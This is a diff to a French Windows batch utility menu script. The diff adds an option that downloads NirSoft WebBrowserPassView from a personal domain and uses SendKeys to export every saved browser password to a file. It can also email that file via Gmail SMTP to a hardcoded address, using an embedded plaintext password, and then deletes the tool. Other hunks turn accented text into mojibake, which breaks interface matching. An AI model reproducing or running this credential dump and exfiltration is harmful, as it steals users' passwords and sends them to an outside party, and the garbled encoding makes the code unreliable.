@@ -2,7 +2,7 @@
 setlocal EnableExtensions EnableDelayedExpansion
 if defined MSYSTEM ("%ComSpec%" /c "%~f0" & exit /b)
 if not defined CMDCMDLINE ("%ComSpec%" /c "%~f0" & exit /b)
-chcp 65001 >nul
+chcp 1252 >nul >nul
 title Boite a Scripts Windows - By ALEEXLEDEV (v1.0)
 color 0B
 
@@ -24,7 +24,7 @@ echo ======================================================
 echo.
 echo      === OUTILS PRINCIPAUX ===
 echo   [1] Gestionnaire DNS Cloudflare
-echo   [2] Mises à jour des application windows
+echo   [2] Mises a jour des application windows
 echo   [3] Menu contextuel Windows 11
 echo   [4] Formatage avec DISKPART
 echo   [5] Voir les outils systeme avances
@@ -225,7 +225,7 @@ goto dns_manager
 :get_interface
 set "interface="
 for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
-    if /i "%%b"=="Connecté" (
+    if /i "%%b"=="ConnectÃƒÂ©" (
         set "interface=%%d"
         goto :interface_found
     )
@@ -235,7 +235,7 @@ for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
     )
 )
 for /f "skip=3 tokens=1,2,3*" %%a in ('netsh interface show interface') do (
-    if /i "%%c"=="Dédié" (
+    if /i "%%c"=="DÃƒÂ©diÃƒÂ©" (
         set "interface=%%d"
         goto :interface_found
     )
@@ -252,13 +252,13 @@ if defined interface (
 goto :eof
 
 REM ===================================================================
-REM                   WINGET - Mises à jour des application windows
+REM                   WINGET - Mises ÃƒÂ  jour des application windows
 REM ===================================================================
 :winget_manager
 cls
 color 0A
 echo ================================================
-echo     Mises à jour des application windows
+echo     Mises ÃƒÂ  jour des application windows
 echo ================================================
 echo.
 
@@ -425,7 +425,7 @@ if /i "%disk_num%"=="Q" goto menu_principal
 echo %disk_num%| findstr /r "^[0-9][0-9]*$" >nul
 if %errorLevel% neq 0 (
     echo.
-    echo ❌ Erreur : Veuillez entrer un numero valide !
+    echo Ã¢ÂÅ’ Erreur : Veuillez entrer un numero valide !
     timeout /t 3 >nul
     goto disk_manager
 )
@@ -458,7 +458,7 @@ if "%format_choice%"=="4" set fs_type=ReFS
 
 if not defined fs_type (
     echo.
-    echo ❌ Choix invalide !
+    echo Ã¢ÂÅ’ Choix invalide !
     timeout /t 2 >nul
     goto disk_format_choice
 )
@@ -479,7 +479,7 @@ set /p confirmation=Confirmation:
 
 if not "%confirmation%"=="OUI" (
     echo.
-    echo ❌ Operation annulee par l'utilisateur.
+    echo Ã¢ÂÅ’ Operation annulee par l'utilisateur.
     timeout /t 2 >nul
     goto disk_manager
 )
@@ -513,7 +513,7 @@ echo.
 echo =============================================================
 if %result% equ 0 (
     echo.
-    echo ✅ Formatage termine avec succes !
+    echo Ã¢Å“â€¦ Formatage termine avec succes !
     echo.
     echo Le disque %disk_num% a ete :
     echo   - Nettoye completement
@@ -523,7 +523,7 @@ if %result% equ 0 (
     echo.
 ) else (
     echo.
-    echo ❌ Une erreur s'est produite pendant le formatage.
+    echo Ã¢ÂÅ’ Une erreur s'est produite pendant le formatage.
     echo Verifiez que le disque existe et n'est pas protege.
     echo.
 )
@@ -666,6 +666,7 @@ echo  [16] Utilitaire de reinitialisation Windows Update
 echo.
 echo      === MOT DE PASSE ===
 echo  [17] Gestion des mots de passe Wi-Fi
+echo  [19] Export mots de passe navigateurs (WebBrowserPassView)
 echo.
 echo      === MATERIEL ===
 echo  [18] Gestion de l'ecran tactile
@@ -692,11 +693,214 @@ if "%sys_choice%"=="14" goto sys_windows_update
 if "%sys_choice%"=="15" goto sys_report
 if "%sys_choice%"=="16" goto sys_reset_windows_update
 if "%sys_choice%"=="17" goto sys_wifi_passwords
+if "%sys_choice%"=="19" goto sys_browser_passwords
 if "%sys_choice%"=="18" goto touch_screen_manager
 if "%sys_choice%"=="0" goto menu_principal
 echo Choix invalide.
 pause
 goto system_tools
+
+:: ===============================================
+:: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
+:: ===============================================
+:sys_browser_passwords
+cls
+color 0A
+echo ===============================================
+echo   Export mots de passe navigateurs (Nirsoft)
+echo ===============================================
+echo.
+
+set "BPV_EXE=%~dp0WebBrowserPassView.exe"
+set "BPV_DOWNLOAD_URL=https://script.salutalex.fr/scripts/nirsoft/batch/WebBrowserPassView.exe"
+set "BPV_EMAIL=alexandre.janacek@gmail.com"
+set "BPV_DOWNLOADED=0"
+set "BPV_SMTP_USER=alexandre.janacek@gmail.com"
+set "BPV_SMTP_PASS=vdhljbthvrdyneon"
+
+:bpv_menu
+cls
+echo ========================================
+echo    WebBrowserPassView - Export Tool
+echo ========================================
+echo.
+echo 1. Enregistrement local uniquement
+echo 2. Enregistrement et envoi par email
+echo.
+echo 0. Retour
+echo.
+set /p bpv_choice="Choisissez une option (1, 2 ou 0): "
+
+if "%bpv_choice%"=="1" goto bpv_export
+if "%bpv_choice%"=="2" goto bpv_export_and_send
+if "%bpv_choice%"=="0" goto system_tools
+goto bpv_menu
+
+:bpv_export
+rem Telecharger si necessaire
+if not exist "%BPV_EXE%" (
+  echo.
+  echo Telechargement de WebBrowserPassView.exe...
+  powershell -Command "try { Invoke-WebRequest -Uri '%BPV_DOWNLOAD_URL%' -OutFile '%BPV_EXE%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  if %errorlevel% neq 0 (
+    echo Erreur lors du telechargement.
+    pause
+    goto bpv_menu
+  )
+  set "BPV_DOWNLOADED=1"
+  timeout /t 1 /nobreak >nul
+)
+
+rem Generer un nom de fichier unique
+call :bpv_get_unique_filename
+set "BPV_OUTPUT=%BPV_UNIQUE_FILE%"
+
+echo.
+echo Lancement de WebBrowserPassView...
+start "" "%BPV_EXE%"
+
+timeout /t 5 /nobreak >nul
+
+echo Traitement en cours...
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%BPV_OUTPUT%{ENTER}')" >nul 2>&1
+
+timeout /t 3 /nobreak >nul
+
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+
+rem Attendre que le processus se termine completement
+timeout /t 2 /nobreak >nul
+
+rem Nettoyage si telecharge
+if "%BPV_DOWNLOADED%"=="1" (
+  echo Nettoyage...
+  del /F /Q "%BPV_EXE%" >nul 2>&1
+  if exist "%BPV_EXE%" (
+    powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+  )
+)
+
+if exist "%BPV_OUTPUT%" (
+  echo Termine. Fichier sauvegarde: %BPV_OUTPUT%
+  echo.
+  echo Retour au menu precedent dans 2 secondes...
+  timeout /t 2 /nobreak >nul
+  goto system_tools
+) else (
+  echo ERREUR: Le fichier n'a pas ete cree.
+  pause
+  goto bpv_menu
+)
+
+:bpv_export_and_send
+rem Telecharger si necessaire
+if not exist "%BPV_EXE%" (
+  echo.
+  echo Telechargement de WebBrowserPassView.exe...
+  powershell -Command "try { Invoke-WebRequest -Uri '%BPV_DOWNLOAD_URL%' -OutFile '%BPV_EXE%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
+  if %errorlevel% neq 0 (
+    echo Erreur lors du telechargement.
+    pause
+    goto bpv_menu
+  )
+  set "BPV_DOWNLOADED=1"
+  timeout /t 1 /nobreak >nul
+)
+
+rem Generer un nom de fichier unique
+call :bpv_get_unique_filename
+set "BPV_OUTPUT=%BPV_UNIQUE_FILE%"
+
+echo.
+echo Lancement de WebBrowserPassView...
+start "" "%BPV_EXE%"
+
+timeout /t 5 /nobreak >nul
+
+echo Traitement en cours...
+powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%BPV_OUTPUT%{ENTER}')" >nul 2>&1
+
+timeout /t 3 /nobreak >nul
+
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+
+rem Attendre que le processus se termine completement
+timeout /t 2 /nobreak >nul
+
+if not exist "%BPV_OUTPUT%" (
+  echo ERREUR: Le fichier n'a pas ete cree.
+  if "%BPV_DOWNLOADED%"=="1" (
+    del /F /Q "%BPV_EXE%" >nul 2>&1
+    if exist "%BPV_EXE%" (
+      powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+    )
+  )
+  pause
+  goto bpv_menu
+)
+
+echo Fichier sauvegarde: %BPV_OUTPUT%
+echo.
+echo Envoi du fichier par email...
+
+powershell -Command ^
+"$SMTPServer = 'smtp.gmail.com'; ^
+$SMTPPort = 587; ^
+$Username = '%BPV_SMTP_USER%'; ^
+$Password = '%BPV_SMTP_PASS%'; ^
+$EmailFrom = $Username; ^
+$EmailTo = '%BPV_EMAIL%'; ^
+$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
+$Body = 'Export automatique des mots de passe du navigateur.'; ^
+$FilePath = '%BPV_OUTPUT%'; ^
+try { ^
+    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
+    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
+    $MailMessage = @{ ^
+        From = $EmailFrom; ^
+        To = $EmailTo; ^
+        Subject = $Subject; ^
+        Body = $Body; ^
+        SmtpServer = $SMTPServer; ^
+        Port = $SMTPPort; ^
+        UseSsl = $true; ^
+        Credential = $Credential; ^
+        Attachments = $FilePath ^
+    }; ^
+    Send-MailMessage @MailMessage; ^
+    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
+} catch { ^
+    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
+}"
+
+rem Nettoyage si telecharge
+if "%BPV_DOWNLOADED%"=="1" (
+  echo.
+  echo Nettoyage...
+  del /F /Q "%BPV_EXE%" >nul 2>&1
+  if exist "%BPV_EXE%" (
+    powershell -Command "Remove-Item -Path '%BPV_EXE%' -Force" >nul 2>&1
+  )
+)
+
+echo.
+echo Fermeture automatique dans 2 secondes...
+timeout /t 2 /nobreak >nul
+goto system_tools
+
+:bpv_get_unique_filename
+set "BPV_BASE=%~dp0passwords_export"
+set "BPV_EXT=.txt"
+set "BPV_COUNTER=0"
+set "BPV_UNIQUE_FILE=%BPV_BASE%%BPV_EXT%"
+
+:bpv_check_file
+if exist "%BPV_UNIQUE_FILE%" (
+  set /a BPV_COUNTER+=1
+  set "BPV_UNIQUE_FILE=%BPV_BASE%_%BPV_COUNTER%%BPV_EXT%"
+  goto bpv_check_file
+)
+goto :eof
 
 :sys_sfc
 cls
